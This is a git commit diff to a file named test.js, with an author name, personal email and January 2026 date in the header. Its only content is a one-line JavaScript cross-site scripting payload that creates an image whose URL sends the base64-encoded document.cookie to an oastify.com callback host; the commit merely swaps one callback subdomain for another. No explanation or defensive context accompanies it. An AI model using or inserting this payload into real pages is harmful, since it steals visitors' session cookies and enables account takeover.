f4a15fcdc089df9ff206921b5a7b3921cc0bac0e
Kiano-1995 <mohammad.mrt.1995@gmail.com>
2026-01-05 13:44:09 +0330

    test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://k5qts5w28179gymiltyx8smzlqrhf73w.oastify.com?data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://yqs7djhgtfsn1c7w67jbt67d64cv0ood.oastify.com?data='+btoa(document.cookie);
